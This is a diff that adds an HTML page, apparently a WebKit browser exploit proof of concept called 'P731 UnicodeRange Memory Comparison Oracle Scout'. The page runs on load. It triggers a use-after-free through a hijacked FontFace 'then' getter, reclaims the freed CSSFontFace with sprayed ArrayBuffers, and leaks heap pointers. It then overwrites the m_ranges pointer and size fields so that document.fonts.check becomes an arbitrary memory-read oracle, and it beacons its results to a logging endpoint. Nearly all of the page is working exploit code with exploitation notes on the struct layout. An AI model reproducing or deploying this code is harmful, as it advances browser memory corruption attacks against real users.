@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P731 — UnicodeRange Memory Comparison Oracle Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P731 — UnicodeRange Memory Comparison Oracle Scout
+ *
+ * Ground Truth from WebCore C++ Source Code Audit:
+ * 1. CSSFontFace struct layout:
+ *      q0  (offset +0x00): m_refCount
+ *      q1, q2 (offset +0x08, +0x10): m_propertiesOrCSSConnection
+ *      q3  (offset +0x18): m_families
+ *      q4  (offset +0x20): m_ranges.m_buffer  <-- POINTER TO UNICODE RANGES!
+ *      q5  (offset +0x28): m_ranges.m_capacity << 32 | m_ranges.m_size
+ *      q6..q10: m_featureSettings, m_sizeAdjust, etc.
+ *      q11 (offset +0x58): m_sources.m_buffer
+ *      q12 (offset +0x60): m_sources.m_capacity << 32 | m_sources.m_size
+ * 2. In CSSFontFace::rangesMatchCodePoint(UChar32 character):
+ *      for (auto& range : m_ranges) {
+ *          if (range.from <= character && character <= range.to)
+ *              return true;
+ *      }
+ *      return false;
+ * 3. Each UnicodeRange is { uint32 from, uint32 to } (8 bytes per entry).
+ * 4. In JS: document.fonts.check('1em trFam', text) calls rangesMatchCodePoint!
+ * 5. By pointing q4 to ANY address P and binary searching character,
+ *    we obtain an Absolute, Crash-Proof Arbitrary Memory Read Oracle!
+ *
+ * Objectives of P731:
+ * 1. Reclaim CSSFontFace at buffer #68.
+ * 2. Set q4 = P58, q5 = 0x0000000100000001n (capacity 1, size 1).
+ * 3. Seed P58 with test range: from = 0x41 ('A'), to = 0x43 ('C').
+ *      VIEW_B[0] = 0x0000004300000041n.
+ * 4. Test document.fonts.check('1em trFam', text):
+ *      'A' (0x41) -> EXPECT TRUE
+ *      'B' (0x42) -> EXPECT TRUE
+ *      'C' (0x43) -> EXPECT TRUE
+ *      'D' (0x44) -> EXPECT FALSE
+ *      'Z' (0x5A) -> EXPECT FALSE
+ * 5. Also test via canvas ctx.measureText() font selection.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P731-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+var P58 = null, P68 = null;
+var FACE_B = null, BUF_B = null, VIEW_B = null;
+
+function snap(){
+  if(!VIEW_B) return [];
+  var arr = [];
+  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
+  return arr;
+}
+
+function diffSnap(pre){
+  if(!VIEW_B || !pre.length) return 'none';
+  var ch = [];
+  for(var q=0; q<24; q++){
+    if(VIEW_B[q] !== pre[q]){
+      ch.push('q' + q + '=0x' + h16(VIEW_B[q]));
+    }
+  }
+  return ch.length ? ch.join(',') : 'none';
+}
+
+function run(){
+  b('BOOT','p731-oracle-scout');
+  log('=== P731 UnicodeRange Memory Comparison Oracle Scout ===\n');
+
+  /* Step 1: Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Deterministic Reclaim */
+    log('[Step 2] Executing deterministic reclaim...');
+    doReclaim(function(){
+      /* Step 3: Test Memory Comparison Oracle */
+      log('\n[Step 3] Testing UnicodeRange comparison oracle...');
+      testOracle();
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Deterministic Reclaim ---- */
+function doReclaim(cb){
+  b('REC-START', 'fill_q12_q6=0x' + h16(P58));
+
+  var stTr = document.createElement('style');
+  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW = [], firedW = false;
+
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedW) return undefined; firedW = true;
+      if(stTr){ stTr.remove(); stTr.textContent = ''; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0; k<80; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;
+        view[6]  = P58;
+        absW.push(ab);
+      }
+
+      try{ document.fonts.check('1em trFam'); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em trFace, trFam', 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for(var i=0; i<absW.length; i++){
+      var u = new Uint8Array(absW[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if(best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Reclaim missed!');
+      return;
+    }
+
+    BUF_B = absW[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+
+    b('RECLAIM-OK', 'baseK=' + best);
+    log('Deterministic Reclaim OK at slot ' + best);
+
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+/* ---- Step 3: Test UnicodeRange Comparison Oracle ---- */
+function testOracle(){
+  if(!VIEW_B) return;
+
+  /* Step 3A: Check baseline document.fonts.check */
+  var chkBaseA = document.fonts.check('1em trFam', 'A');
+  var chkBaseG = document.fonts.check('1em trFam', 'G');
+  b('ORACLE-BASE', 'chA=' + chkBaseA + '|chG=' + chkBaseG);
+
+  /* Step 3B: Configure m_ranges at q4 and q5!
+   * Seed P58 + 0x00 (VIEW_B[0]):
+   *   range.from = 0x41 ('A')
+   *   range.to   = 0x43 ('C')
+   *   Little endian 64-bit: (0x43 << 32) | 0x41 = 0x0000004300000041n
+   */
+  VIEW_B[0] = 0x0000004300000041n;
+
+  /* Point m_ranges.m_buffer (q4) to P58! */
+  VIEW_B[4] = P58;
+  /* Set m_ranges.m_capacity = 1, m_ranges.m_size = 1 (q5) */
+  VIEW_B[5] = 0x0000000100000001n;
+
+  b('ORACLE-POISON-OK', 'q4_buf=P58|q5_size=1|range=0x0041-0x0043');
+
+  /* Step 3C: Query characters through fonts.check('1em trFam', char) */
+  var chA = document.fonts.check('1em trFam', 'A'); /* 0x41: IN RANGE */
+  var chB = document.fonts.check('1em trFam', 'B'); /* 0x42: IN RANGE */
+  var chC = document.fonts.check('1em trFam', 'C'); /* 0x43: IN RANGE */
+  var chD = document.fonts.check('1em trFam', 'D'); /* 0x44: OUT OF RANGE! */
+  var chZ = document.fonts.check('1em trFam', 'Z'); /* 0x5A: OUT OF RANGE! */
+
+  var oracleReport = 'A=' + chA + '|B=' + chB + '|C=' + chC + '|D=' + chD + '|Z=' + chZ;
+  b('ORACLE-RESULTS', oracleReport);
+  log('Oracle Test: ' + oracleReport);
+
+  /* Step 3D: Test second range: 0x58 ('X') to 0x5A ('Z') */
+  VIEW_B[0] = 0x0000005A00000058n;
+  var ch2A = document.fonts.check('1em trFam', 'A'); /* 0x41: OUT OF RANGE */
+  var ch2Y = document.fonts.check('1em trFam', 'Y'); /* 0x59: IN RANGE! */
+  var ch2Z = document.fonts.check('1em trFam', 'Z'); /* 0x5A: IN RANGE! */
+  b('ORACLE-SHIFT', 'A=' + ch2A + '|Y=' + ch2Y + '|Z=' + ch2Z);
+
+  /* Step 3E: Final State Dump */
+  var finalDump = [];
+  for(var q=0; q<16; q++) finalDump.push('q' + q + '=0x' + h16(VIEW_B[q]));
+  b('FINAL-STATE', finalDump.join(';').slice(0, 700));
+
+  b('DONE', 'p731-complete');
+  log('\n=== P731 Complete! ===');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P731 — UnicodeRange Memory Comparison Oracle Scout running...</pre></body></html>
